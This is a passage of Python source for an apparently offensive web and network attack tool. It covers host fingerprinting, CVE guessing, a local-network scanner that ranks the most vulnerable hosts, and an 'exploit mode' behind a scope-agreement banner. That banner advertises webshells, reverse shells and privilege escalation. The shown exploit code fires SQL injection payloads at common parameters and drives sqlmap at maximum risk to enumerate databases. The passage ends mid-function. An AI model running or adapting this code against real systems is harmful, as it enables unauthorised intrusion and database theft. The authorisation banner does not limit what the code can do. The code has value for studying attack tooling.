            self.run_wordpress_scan, self.run_wp_plugins, self.run_wp_exploit,
            self.run_gravityforms, self.run_upload_check, self.run_sqli_scan,
            self.run_shell_finder, self.run_joomla_rce, self.run_vbulletin_rce,
            self.run_bypass_cf, self.run_poet, self.run_inurlbr,
            self.run_port_scan_deep, self.run_ssl_audit,
        ]
        for step in steps:
            if self.cancelled: break
            try:
                step()
            except Exception as e:
                self._log(f"Tool error: {e}", "ERROR")

        self._log("Deep scan finished.", "SUCCESS")
        self._prog(100)


# ═══════════════════════════════════════════════════════════════
# SERVICE FINGERPRINTER — Detect OS, router, CMS, tech stack
# ═══════════════════════════════════════════════════════════════
class ServiceFingerprinter:
    """Identifies what a host is: router, server OS, CMS, IoT device, etc."""

    ROUTER_SIGNATURES = {
        "mikrotik":    "MikroTik RouterOS",
        "routeros":    "MikroTik RouterOS",
        "dd-wrt":      "DD-WRT Router",
        "openwrt":     "OpenWrt Router",
        "tomato":      "Tomato Firmware",
        "ubnt":        "Ubiquiti EdgeRouter",
        "edgeos":      "Ubiquiti EdgeOS",
        "cisco":       "Cisco IOS",
        "juniper":     "Juniper JunOS",
        "fortigate":   "Fortinet FortiGate",
        "pfsense":     "pfSense Firewall",
        "opnsense":    "OPNsense Firewall",
        "zyxel":       "ZyXEL Router",
        "netgear":     "NETGEAR Router",
        "tp-link":     "TP-Link Router",
        "asus":        "ASUS Router",
        "d-link":      "D-Link Router",
        "linksys":     "Linksys Router",
        "huawei":      "Huawei Router",
        "keenetic":    "Keenetic Router",
        "synology":    "Synology NAS",
        "qnap":        "QNAP NAS",
        "hikvision":   "Hikvision Camera",
        "dahua":       "Dahua Camera",
        "axis":        "Axis Camera",
    }

    CMS_SIGNATURES = {
        "wordpress":   "WordPress",
        "wp-content":  "WordPress",
        "wp-json":     "WordPress",
        "joomla":      "Joomla",
        "drupal":      "Drupal",
        "bitrix":      "1C-Bitrix",
        "modx":        "MODX",
        "opencart":    "OpenCart",
        "magento":     "Magento",
        "shopify":     "Shopify",
        "wix.com":     "Wix",
        "squarespace": "Squarespace",
        "ghost":       "Ghost CMS",
        "typo3":       "TYPO3",
        "prestashop":  "PrestaShop",
        "laravel":     "Laravel",
        "django":      "Django",
        "flask":       "Flask",
        "express":     "Express.js",
        "next.js":     "Next.js",
        "nuxt":        "Nuxt.js",
    }

    OS_SIGNATURES = {
        "ubuntu":      "Ubuntu Linux",
        "debian":      "Debian Linux",
        "centos":      "CentOS Linux",
        "red hat":     "Red Hat Enterprise Linux",
        "fedora":      "Fedora Linux",
        "freebsd":     "FreeBSD",
        "openbsd":     "OpenBSD",
        "windows":     "Microsoft Windows",
        "win32":       "Microsoft Windows",
        "win64":       "Microsoft Windows",
        "iis":         "Microsoft Windows (IIS)",
        "darwin":      "macOS",
    }

    def __init__(self, domain, log_cb=None):
        self.domain = domain
        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
        self.result = {
            "device_type": "unknown",
            "os": "unknown",
            "cms": [],
            "server_software": "unknown",
            "technologies": [],
            "is_router": False,
            "is_iot": False,
            "is_nas": False,
        }

    def _log(self, msg, level="INFO"):
        self.log_cb(msg, level)

    def fingerprint(self) -> dict:
        self._log("Fingerprinting target device/server...", "STEP")

        # 1) HTTP banner + headers
        headers_data = self._grab_http()

        # 2) Banner grabbing on key ports
        self._grab_banners()

        # 3) TTL-based OS detection
        self._ttl_detect()

        # 4) Nmap OS detection if available
        self._nmap_os_detect()

        # Summary
        dtype = self.result["device_type"]
        osys = self.result["os"]
        cms_list = ", ".join(self.result["cms"]) if self.result["cms"] else "none"
        self._log(f"  Device type     : {dtype}", "FOUND")
        self._log(f"  OS              : {osys}", "FOUND")
        self._log(f"  CMS             : {cms_list}", "FOUND")
        if self.result["technologies"]:
            self._log(f"  Technologies    : {', '.join(self.result['technologies'][:5])}", "FOUND")

        return self.result

    def _grab_http(self):
        for proto in ("https", "http"):
            try:
                url = f"{proto}://{self.domain}"
                req = Request(url, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                })
                with urlopen(req, timeout=8) as resp:
                    headers = dict(resp.headers)
                    body = resp.read(8192).decode("utf-8", errors="ignore").lower()

                    # Server header
                    server = headers.get("Server", "").lower()
                    self.result["server_software"] = headers.get("Server", "unknown")

                    # X-Powered-By
                    powered = headers.get("X-Powered-By", "").lower()
                    if powered:
                        self.result["technologies"].append(f"X-Powered-By: {headers.get('X-Powered-By','')}")

                    # Check for router signatures
                    combined = server + " " + body + " " + powered
                    for sig, name in self.ROUTER_SIGNATURES.items():
                        if sig in combined:
                            self.result["device_type"] = "router/firewall"
                            self.result["is_router"] = True
                            self.result["technologies"].append(name)
                            self._log(f"  [FP] Router detected: {name}", "WARN")
                            break

                    # Check for NAS
                    if any(x in combined for x in ["synology", "qnap", "nas", "diskstation"]):
                        self.result["device_type"] = "NAS"
                        self.result["is_nas"] = True

                    # Check for IoT/Camera
                    if any(x in combined for x in ["hikvision", "dahua", "axis", "camera", "dvr", "nvr"]):
                        self.result["device_type"] = "IoT/Camera"
                        self.result["is_iot"] = True

                    # Check CMS
                    for sig, name in self.CMS_SIGNATURES.items():
                        if sig in combined:
                            if name not in self.result["cms"]:
                                self.result["cms"].append(name)

                    # OS from Server header
                    for sig, name in self.OS_SIGNATURES.items():
                        if sig in server:
                            self.result["os"] = name
                            break

                    # Detect web technologies from headers/body
                    if "x-aspnet-version" in str(headers).lower():
                        self.result["technologies"].append("ASP.NET")
                        if self.result["os"] == "unknown":
                            self.result["os"] = "Microsoft Windows"
                    if "php" in combined:
                        self.result["technologies"].append("PHP")
                    if "x-generator" in str(headers).lower():
                        self.result["technologies"].append(f"Generator: {headers.get('X-Generator','')}")

                    if self.result["device_type"] == "unknown":
                        self.result["device_type"] = "web server"

                    return headers
            except Exception:
                continue
        return {}

    def _grab_banners(self):
        try:
            ip = socket.gethostbyname(self.domain)
        except:
            return

        banner_ports = {22: "SSH", 21: "FTP", 23: "Telnet", 25: "SMTP",
                        8291: "MikroTik-API", 8728: "MikroTik-API",
                        8080: "HTTP-Alt", 161: "SNMP"}
        for port, svc in banner_ports.items():
            try:
                s = socket.socket(); s.settimeout(1.5)
                s.connect((ip, port))
                if port in (80, 8080):
                    s.send(b"HEAD / HTTP/1.0\r\nHost: " + self.domain.encode() + b"\r\n\r\n")
                banner = s.recv(256).decode("utf-8", errors="ignore").strip().lower()
                s.close()
                if not banner:
                    continue

                # Check SSH banner for OS
                if port == 22:
                    if "ubuntu" in banner:
                        self.result["os"] = "Ubuntu Linux"
                    elif "debian" in banner:
                        self.result["os"] = "Debian Linux"
                    self.result["technologies"].append(f"SSH: {banner[:60]}")

                # Check for router indicators
                for sig, name in self.ROUTER_SIGNATURES.items():
                    if sig in banner:
                        self.result["device_type"] = "router/firewall"
                        self.result["is_router"] = True
                        self.result["technologies"].append(name)
                        self._log(f"  [FP] Router via port {port}: {name}", "WARN")
                        break
            except:
                continue

    def _ttl_detect(self):
        """Detect OS based on default TTL values."""
        if self.result["os"] != "unknown":
            return
        try:
            ip = socket.gethostbyname(self.domain)
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "2", ip],
                capture_output=True, text=True, timeout=5
            )
            ttl_match = re.search(r'ttl[=:](\d+)', result.stdout.lower())
            if ttl_match:
                ttl = int(ttl_match.group(1))
                if ttl <= 64:
                    self.result["os"] = "Linux/Unix (TTL<=64)"
                elif ttl <= 128:
                    self.result["os"] = "Windows (TTL<=128)"
                elif ttl <= 255:
                    self.result["os"] = "Network device (TTL<=255)"
                self._log(f"  [FP] TTL={ttl} → {self.result['os']}", "INFO")
        except:
            pass

    def _nmap_os_detect(self):
        """Try nmap OS detection if available (needs root)."""
        if self.result["os"] != "unknown" and "TTL" not in self.result["os"]:
            return
        try:
            result = subprocess.run(
                ["nmap", "-O", "--osscan-guess", "-T4", self.domain],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.split("\n"):
                if "running:" in line.lower() or "os details:" in line.lower():
                    os_info = line.split(":", 1)[1].strip()
                    self.result["os"] = os_info
                    self._log(f"  [FP] Nmap OS: {os_info}", "FOUND")
                    break
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# CVE VERIFIER — Check if CVE is actually exploitable (no exploit)
# ═══════════════════════════════════════════════════════════════
class CVEVerifier:
    """Verifies if discovered CVEs are potentially valid for the target.
    Does NOT exploit — only checks version/config indicators."""

    def __init__(self, domain, open_ports, log_cb=None):
        self.domain = domain
        self.open_ports = open_ports  # list of {"port":N, "service":"X", "banner":"Y", "cves":[...]}
        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
        self.verified = []

    def _log(self, msg, level="INFO"):
        self.log_cb(msg, level)

    def verify_all(self) -> list:
        self._log("Verifying CVE applicability on open ports...", "STEP")
        for port_info in self.open_ports:
            port = port_info["port"]
            service = port_info["service"]
            banner = port_info.get("banner", "")
            cves = port_info.get("cves", [])

            if not cves:
                continue

            self._log(f"  Checking {service} on port {port} ({len(cves)} CVE candidates)...", "INFO")

            for cve_id, desc in cves:
                status = self._verify_single(port, service, banner, cve_id, desc)
                self.verified.append({
                    "port": port,
                    "service": service,
                    "cve_id": cve_id,
                    "description": desc,
                    "status": status,
                })
                color = "ERROR" if status == "LIKELY" else ("WARN" if status == "POSSIBLE" else "INFO")
                self._log(f"    {cve_id}: {status} — {desc[:50]}", color)

        likely_count = sum(1 for v in self.verified if v["status"] == "LIKELY")
        possible_count = sum(1 for v in self.verified if v["status"] == "POSSIBLE")
        self._log(f"  CVE verification: {likely_count} LIKELY, {possible_count} POSSIBLE, "
                  f"{len(self.verified) - likely_count - possible_count} UNLIKELY", "INFO")
        return self.verified

    def _verify_single(self, port, service, banner, cve_id, desc) -> str:
        """Check if a specific CVE might apply. Returns LIKELY/POSSIBLE/UNLIKELY."""
        banner_low = banner.lower()
        desc_low = desc.lower()

        # Version-based checks
        version_match = re.search(r'(\d+\.\d+[\.\d]*)', banner)
        if version_match:
            version = version_match.group(1)
            # Check if CVE description mentions specific versions
            if version in desc:
                return "LIKELY"

        # Service-specific verification
        if service.lower() == "ssh" and "openssh" in banner_low:
            return self._verify_ssh(banner_low, cve_id)
        if service.lower() in ("http", "https", "http-alt"):
            return self._verify_http(port, cve_id, desc_low)
        if service.lower() == "ftp":
            return self._verify_ftp(banner_low, cve_id)
        if service.lower() in ("mysql", "mariadb", "postgresql"):
            return self._verify_db(port, banner_low, cve_id)
        if service.lower() == "smb":
            return self._verify_smb(port, cve_id)
        if service.lower() == "redis":
            return self._verify_redis(port, cve_id)

        # Generic: if banner mentions service name in CVE, it's possible
        svc_in_cve = service.lower().replace("-", "")
        if svc_in_cve in desc_low:
            return "POSSIBLE"

        return "UNLIKELY"

    def _verify_ssh(self, banner, cve_id) -> str:
        ver_match = re.search(r'openssh[_\s]*(\d+\.\d+)', banner)
        if not ver_match:
            return "POSSIBLE"
        ver = float(ver_match.group(1))
        vuln_map = {
            "CVE-2023-38408": ver < 9.4,
            "CVE-2023-25136": ver < 9.2,
            "CVE-2021-28041": ver < 8.5,
            "CVE-2019-6111": ver < 8.0,
            "CVE-2018-15473": ver < 7.8,
            "CVE-2016-10009": ver < 7.4,
        }
        if cve_id in vuln_map:
            return "LIKELY" if vuln_map[cve_id] else "UNLIKELY"
        return "POSSIBLE"

    def _verify_http(self, port, cve_id, desc) -> str:
        """Check HTTP-related CVEs by probing headers."""
        try:
            proto = "https" if port == 443 else "http"
            url = f"{proto}://{self.domain}:{port}/"
            req = Request(url, headers={"User-Agent": "Mozilla/5.0 (WebGate/4.0)"})
            with urlopen(req, timeout=5) as resp:
                server = resp.headers.get("Server", "").lower()
                powered = resp.headers.get("X-Powered-By", "").lower()

                # Apache version check
                if "apache" in server and "apache" in desc:
                    ver_m = re.search(r'apache/(\d+\.\d+\.\d+)', server)
                    if ver_m:
                        ver = ver_m.group(1)
                        if "2.4.49" in desc and ver == "2.4.49":
                            return "LIKELY"
                        if "2.4.50" in desc and ver == "2.4.50":
                            return "LIKELY"
                    return "POSSIBLE"

                # nginx version check
                if "nginx" in server and "nginx" in desc:
                    return "POSSIBLE"

                # Log4Shell check (Java apps)
                if "log4" in desc:
                    if any(x in server + powered for x in ["java", "tomcat", "spring", "jetty"]):
                        return "LIKELY"

                return "POSSIBLE"
        except:
            return "POSSIBLE"

    def _verify_ftp(self, banner, cve_id) -> str:
        if "vsftpd 2.3.4" in banner and "CVE-2011-4130" in cve_id:
            return "LIKELY"
        if "proftpd" in banner and "proftpd" in cve_id.lower():
            return "POSSIBLE"
        return "UNLIKELY"

    def _verify_db(self, port, banner, cve_id) -> str:
        """Check if DB port accepts unauthenticated connections."""
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((self.domain, port))
            data = s.recv(256).decode("utf-8", errors="ignore").lower()
            s.close()
            if data:
                return "POSSIBLE"
        except:
            pass
        return "UNLIKELY"

    def _verify_smb(self, port, cve_id) -> str:
        """Basic SMB version probe."""
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((self.domain, port))
            # SMB negotiate
            s.send(b'\x00\x00\x00\x85\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                   b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            resp = s.recv(256)
            s.close()
            if resp and b'SMB' in resp:
                return "POSSIBLE"
        except:
            pass
        return "UNLIKELY"

    def _verify_redis(self, port, cve_id) -> str:
        """Check if Redis is unauthenticated."""
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((self.domain, port))
            s.send(b"PING\r\n")
            resp = s.recv(64).decode("utf-8", errors="ignore")
            s.close()
            if "+PONG" in resp:
                self._log(f"    [!] Redis on :{port} accepts unauthenticated commands!", "ERROR")
                return "LIKELY"
        except:
            pass
        return "UNLIKELY"


# ═══════════════════════════════════════════════════════════════
# NETWORK AGENT — Scan entire local network, find most vulnerable
# ═══════════════════════════════════════════════════════════════
class NetworkAgent:
    """Discovers all hosts on the local network, scans each briefly,
    and ranks them by vulnerability score."""

    QUICK_PORTS = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389,
                   5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017]

    def __init__(self, log_cb=None, prog_cb=None):
        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
        self.prog_cb = prog_cb or (lambda v: None)
        self.hosts = []
        self.cancelled = False

    def _log(self, msg, level="INFO"):
        self.log_cb(msg, level)

    def _prog(self, v):
        self.prog_cb(min(100, max(0, int(v))))

    def get_local_networks(self) -> list:
        """Detect local network ranges."""
        networks = []

        # Method 1: netifaces
        if NETIFACES_OK:
            try:
                for iface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            ip = addr.get("addr", "")
                            mask = addr.get("netmask", "255.255.255.0")
                            if ip and not ip.startswith("127."):
                                try:
                                    net = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
                                    networks.append(str(net))
                                except:
                                    pass
            except:
                pass

        # Method 2: ip route (Linux/Termux)
        if not networks:
            try:
                result = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split("\n"):
                    if "src" in line and "default" not in line:
                        parts = line.split()
                        if parts and "/" in parts[0]:
                            networks.append(parts[0])
            except:
                pass

        # Method 3: ifconfig fallback
        if not networks:
            try:
                result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5)
                for match in re.finditer(r'inet\s+(\d+\.\d+\.\d+\.\d+)', result.stdout):
                    ip = match.group(1)
                    if not ip.startswith("127."):
                        net = str(ipaddress.IPv4Network(f"{ip}/24", strict=False))
                        networks.append(net)
            except:
                pass

        # Fallback
        if not networks:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                net = str(ipaddress.IPv4Network(f"{local_ip}/24", strict=False))
                networks.append(net)
            except:
                networks.append("192.168.1.0/24")

        return list(set(networks))

    def discover_hosts(self, network: str) -> list:
        """Discover live hosts using ARP ping or TCP connect."""
        self._log(f"Discovering hosts on {network}...", "STEP")
        live = []

        try:
            net = ipaddress.IPv4Network(network, strict=False)
            hosts = list(net.hosts())

            # Limit to /24 for sanity
            if len(hosts) > 254:
                self._log(f"  Network too large ({len(hosts)} hosts), limiting to /24", "WARN")
                hosts = hosts[:254]

            total = len(hosts)
            self._log(f"  Scanning {total} potential hosts...", "INFO")

            def check_host(ip_str):
                if self.cancelled:
                    return None
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    # Try common ports for host discovery
                    for port in [80, 443, 22, 445, 8080]:
                        if s.connect_ex((ip_str, port)) == 0:
                            s.close()
                            return ip_str
                    s.close()
                except:
                    pass
                # Try ICMP (ping)
                try:
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", "1", ip_str],
                        capture_output=True, timeout=2
                    )
                    if result.returncode == 0:
                        return ip_str
                except:
                    pass
                return None

            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(check_host, str(ip)): str(ip) for ip in hosts}
                done_count = 0
                for future in as_completed(futures):
                    done_count += 1
                    if done_count % 20 == 0:
                        self._prog(int(done_count / total * 30))
                    result = future.result()
                    if result:
                        live.append(result)
                        try:
                            hostname = socket.gethostbyaddr(result)[0]
                        except:
                            hostname = ""
                        self._log(f"  [ALIVE] {result} {('(' + hostname + ')') if hostname else ''}", "FOUND")

        except Exception as e:
            self._log(f"  Discovery error: {e}", "ERROR")

        self._log(f"  Found {len(live)} live hosts", "INFO")
        return live

    def quick_scan_host(self, ip: str) -> dict:
        """Quick vulnerability assessment of a single host."""
        result = {
            "ip": ip,
            "hostname": "",
            "open_ports": [],
            "services": [],
            "vulns": 0,
            "score": 0,
            "device_type": "unknown",
            "os_guess": "unknown",
            "cves": [],
        }

        try:
            result["hostname"] = socket.gethostbyaddr(ip)[0]
        except:
            pass

        # Port scan
        for port in self.QUICK_PORTS:
            if self.cancelled:
                break
            try:
                s = socket.socket(); s.settimeout(0.8)
                if s.connect_ex((ip, port)) == 0:
                    svc_name = self._identify_service(port)
                    banner = ""
                    try:
                        if port in (80, 8080):
                            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        data = s.recv(256).decode("utf-8", errors="ignore").strip()
                        banner = data[:100]
                    except:
                        pass
                    s.close()

                    result["open_ports"].append(port)
                    result["services"].append({"port": port, "service": svc_name, "banner": banner})

                    # CVE lookup
                    cves = query_cve(svc_name.lower())
                    result["cves"].extend([(cve_id, desc, port) for cve_id, desc in cves])
                    result["vulns"] += len(cves)
                else:
                    s.close()
            except:
                pass

        # Calculate vulnerability score
        score = 0
        dangerous_ports = {23, 21, 445, 3389, 5900}  # Telnet, FTP, SMB, RDP, VNC
        exposed_dbs = {3306, 5432, 6379, 27017, 9200}  # MySQL, PG, Redis, Mongo, ES

        for p in result["open_ports"]:
            if p in dangerous_ports:
                score += 30
            elif p in exposed_dbs:
                score += 25
            else:
                score += 5

        score += result["vulns"] * 3

        # Banner-based fingerprinting
        all_banners = " ".join(s.get("banner", "") for s in result["services"]).lower()
        for sig, name in ServiceFingerprinter.ROUTER_SIGNATURES.items():
            if sig in all_banners:
                result["device_type"] = "router"
                result["os_guess"] = name
                score += 20  # Routers are often vulnerable
                break

        # TTL-based OS
        try:
            r = subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                              capture_output=True, text=True, timeout=3)
            ttl_m = re.search(r'ttl[=:](\d+)', r.stdout.lower())
            if ttl_m:
                ttl = int(ttl_m.group(1))
                if ttl <= 64:
                    result["os_guess"] = "Linux/Unix"
                elif ttl <= 128:
                    result["os_guess"] = "Windows"
                elif ttl <= 255:
                    result["os_guess"] = "Network Device"
        except:
            pass

        result["score"] = min(100, score)
        return result

    def _identify_service(self, port: int) -> str:
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "Dev",
            9200: "Elasticsearch", 27017: "MongoDB",
        }
        return services.get(port, f"port-{port}")

    def run(self) -> dict:
        """Full agent scan: discover network, scan all hosts, rank by vulnerability."""
        self._log("=" * 56, "INFO")
        self._log("NETWORK AGENT MODE — Local Network Assessment", "STEP")
        self._log("=" * 56, "INFO")

        networks = self.get_local_networks()
        self._log(f"Detected networks: {', '.join(networks)}", "INFO")
        self._prog(5)

        all_hosts = []
        for net in networks:
            if self.cancelled:
                break
            hosts = self.discover_hosts(net)
            all_hosts.extend(hosts)

        self._prog(30)

        if not all_hosts:
            self._log("No live hosts found on the network.", "WARN")
            return {"hosts": [], "most_vulnerable": None}

        # Scan each host
        self._log(f"\nScanning {len(all_hosts)} discovered hosts...", "STEP")
        self._log("─" * 56, "INFO")
        scanned = []
        for i, ip in enumerate(all_hosts):
            if self.cancelled:
                break
            self._log(f"\n  [{i+1}/{len(all_hosts)}] Scanning {ip}...", "STEP")
            host_result = self.quick_scan_host(ip)
            scanned.append(host_result)

            ports_str = ", ".join(str(p) for p in host_result["open_ports"][:8])
            self._log(f"    Ports: {ports_str or 'none'}", "INFO")
            self._log(f"    Type: {host_result['device_type']} | OS: {host_result['os_guess']}", "INFO")
            self._log(f"    Vuln Score: {host_result['score']}/100 ({host_result['vulns']} CVEs)", "FOUND")

            self._prog(30 + int((i + 1) / len(all_hosts) * 60))

        # Rank by vulnerability score
        scanned.sort(key=lambda h: h["score"], reverse=True)

        self._log("\n" + "=" * 56, "INFO")
        self._log("NETWORK ASSESSMENT RESULTS", "STEP")
        self._log("=" * 56, "INFO")

        for i, host in enumerate(scanned[:10]):
            risk = "CRITICAL" if host["score"] >= 70 else ("HIGH" if host["score"] >= 40 else
                    ("MEDIUM" if host["score"] >= 20 else "LOW"))
            self._log(
                f"  #{i+1}  {host['ip']:<16} Score:{host['score']:>3}/100  "
                f"[{risk}]  Ports:{len(host['open_ports'])}  CVEs:{host['vulns']}  "
                f"({host['os_guess']})",
                "ERROR" if risk in ("CRITICAL", "HIGH") else "WARN" if risk == "MEDIUM" else "INFO"
            )

        most_vuln = scanned[0] if scanned else None
        if most_vuln and most_vuln["score"] > 0:
            self._log(f"\n  Most vulnerable: {most_vuln['ip']} (score {most_vuln['score']})", "ERROR")
            if most_vuln["cves"]:
                self._log("  Top CVEs:", "WARN")
                seen = set()
                for cve_id, desc, port in most_vuln["cves"][:5]:
                    if cve_id not in seen:
                        seen.add(cve_id)
                        self._log(f"    {cve_id} (port {port}): {desc[:50]}", "WARN")

        self._prog(100)
        return {"hosts": scanned, "most_vulnerable": most_vuln}


# ═══════════════════════════════════════════════════════════════
# EXPLOIT FRAMEWORK — Only with Scope Agreement
# ═══════════════════════════════════════════════════════════════
SCOPE_AGREEMENT_TEXT = """
╔══════════════════════════════════════════════════════════════════╗
║              SCOPE AGREEMENT — EXPLOIT MODE                      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  You are about to activate EXPLOIT MODE.                         ║
║  This mode enables ACTIVE exploitation capabilities:             ║
║                                                                  ║
║    • SQL Injection (SQLi) — data extraction, auth bypass         ║
║    • Cross-Site Scripting (XSS) — reflected, stored, DOM         ║
║    • Command Injection — OS command execution                    ║
║    • File Upload — webshell upload attempts                      ║
║    • Backdoor Deployment — reverse shell, bind shell             ║
║    • Brute Force — credential guessing                           ║
║    • Privilege Escalation — post-exploitation                    ║
║                                                                  ║
║  LEGAL REQUIREMENTS:                                             ║
║                                                                  ║
║    1. You MUST have a signed Scope Agreement / Authorization     ║
║       document from the system owner                             ║
║    2. You MUST only target systems explicitly listed in scope    ║
║    3. Unauthorized access is a CRIMINAL OFFENSE under:           ║
║       - CFAA (USA), CMA (UK), StGB §202a (DE)                   ║
║       - and equivalent laws worldwide                            ║
║    4. YOU bear FULL legal responsibility for your actions        ║
║                                                                  ║
║  ACCEPTABLE USE:                                                 ║
║    ✓ Authorized penetration testing with signed scope            ║
║    ✓ CTF competitions and lab environments                       ║
║    ✓ Your own systems and infrastructure                         ║
║                                                                  ║
║  By typing 'Y' you confirm:                                     ║
║    - You have written authorization (Scope Agreement)            ║
║    - You accept full legal responsibility                        ║
║    - You understand this is for AUTHORIZED TESTING ONLY          ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""


class ExploitFramework:
    """Active exploitation framework — requires scope agreement."""

    def __init__(self, domain, log_cb=None, prog_cb=None):
        self.domain = domain
        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
        self.prog_cb = prog_cb or (lambda v: None)
        self.results = {}
        self.cancelled = False
        self.session_id = hashlib.md5(f"{domain}{time.time()}".encode()).hexdigest()[:8]

    def _log(self, msg, level="INFO"):
        self.log_cb(msg, level)

    def _prog(self, v):
        self.prog_cb(min(100, max(0, int(v))))

    def _http_get(self, url, timeout=8, headers=None):
        hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if headers:
            hdrs.update(headers)
        try:
            req = Request(url, headers=hdrs)
            with urlopen(req, timeout=timeout) as r:
                return r.status, r.read(8192).decode("utf-8", errors="ignore"), dict(r.headers)
        except HTTPError as e:
            return e.code, "", dict(e.headers) if hasattr(e, "headers") else {}
        except:
            return 0, "", {}

    def _http_post(self, url, data, timeout=8, content_type="application/x-www-form-urlencoded"):
        try:
            if isinstance(data, str):
                data = data.encode()
            req = Request(url, data=data, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Content-Type": content_type,
            })
            with urlopen(req, timeout=timeout) as r:
                return r.status, r.read(8192).decode("utf-8", errors="ignore")
        except HTTPError as e:
            body = e.read(4096).decode("utf-8", errors="ignore") if hasattr(e, "read") else ""
            return e.code, body
        except:
            return 0, ""

    def run_sqli_exploit(self):
        """Advanced SQL injection testing."""
        self._log("=" * 50, "INFO")
        self._log("[EXPLOIT] SQL Injection Testing", "STEP")
        self._log("=" * 50, "INFO")

        findings = []
        base_url = f"http://{self.domain}"

        # Error-based SQLi
        self._log("  [SQLi] Testing error-based injection...", "INFO")
        error_payloads = [
            ("'", ["sql syntax", "mysql_fetch", "ORA-", "pg_query", "sqlite_",
                   "unclosed quotation", "microsoft ole db", "odbc sql"]),
            ("1 OR 1=1--", ["sql syntax", "you have an error"]),
            ("' UNION SELECT NULL--", ["union", "column"]),
            ("1; WAITFOR DELAY '0:0:5'--", []),  # Time-based
            ("1' AND SLEEP(3)--", []),  # MySQL time-based
            ("' OR '1'='1", ["sql", "error", "warning"]),
            ("admin'--", ["sql", "error", "login"]),
        ]

        for payload, error_sigs in error_payloads:
            if self.cancelled:
                break
            for param in ["id", "page", "cat", "user", "search", "q"]:
                code, body, _ = self._http_get(f"{base_url}/?{param}={payload}", timeout=6)
                body_low = body.lower()
                for sig in error_sigs:
                    if sig.lower() in body_low:
                        findings.append(f"Error-based SQLi: param={param}, payload={payload}")
                        self._log(f"  [SQLi] VULNERABLE: ?{param}={payload} → {sig}", "ERROR")
                        break

        # Blind SQLi (time-based)
        self._log("  [SQLi] Testing time-based blind injection...", "INFO")
        for param in ["id", "page"]:
            try:
                start = time.time()
                self._http_get(f"{base_url}/?{param}=1' AND SLEEP(3)--", timeout=8)
                elapsed = time.time() - start
                if elapsed >= 2.5:
                    findings.append(f"Time-based blind SQLi: param={param}")
                    self._log(f"  [SQLi] TIME-BASED BLIND: ?{param} (delay={elapsed:.1f}s)", "ERROR")
            except:
                pass

        # SQLMap — interactive DB/table dump with simplified output
        if subprocess.run(["which", "sqlmap"], capture_output=True).returncode == 0:
            self._log("  [SQLi] SQLMap — detecting injection + enumerating databases…", "STEP")
            try:
                result = subprocess.run(
                    ["sqlmap", "-u", f"{base_url}/?id=1",
                     "--batch", "--level=3", "--risk=3",
                     "--crawl=2", "--forms", "--random-agent",
                     "--technique=BEUSTQ", "--threads=4",
                     "--dbs", "--output-dir=/tmp/sqlmap_wg"],
                    capture_output=True, text=True, timeout=300
                )
                out = result.stdout
                vulnerable = "is vulnerable" in out.lower() or "sqlinjection" in out.lower()
                vuln_param = ""
                vuln_payload = ""
                databases = []
                for line in out.split("\n"):
                    ls = line.strip()
                    if "is vulnerable" in ls.lower():
                        vuln_param = ls[:80]
                    if "payload:" in ls.lower():
                        vuln_payload = ls.split(":", 1)[-1].strip()[:80]
                    if ls.startswith("[*]") and len(ls) > 4:
                        candidate = ls[3:].strip().strip("'\"")
                        if candidate and "available database" not in candidate.lower() and len(candidate) < 64:
                            databases.append(candidate)
                    m = re.match(r"\|\s+(\w[\w$]*)\s+\|", ls)
                    if m and m.group(1) not in ("Database", "databases", "information"):
                        db_name = m.group(1)
                        if db_name not in databases:
                            databases.append(db_name)

                if vulnerable or databases:
                    findings.append("SQLMap: SQL Injection CONFIRMED")
                    self._log("  [SQLi] RESULT: Injection FOUND", "ERROR")
                    if vuln_param:
                        findings.append(f"Vulnerable: {vuln_param}")
                        self._log(f"    · Vulnerable parameter: {vuln_param}", "WARN")
                    if vuln_payload:
                        findings.append(f"Payload that causes injection: {vuln_payload}")
                        self._log(f"    · Injection payload: {vuln_payload}", "WARN")
                    if databases:
                        self._log(f"  [SQLi] Databases found ({len(databases)}):", "FOUND")
                        for db in databases:
                            self._log(f"    · {db}", "FOUND")
                        findings.append(f"Databases: {', '.join(databases)}")
                        self.results["sqlmap_databases"]      = databases
                        self.results["sqlmap_injectable_url"] = f"{base_url}/?id=1"
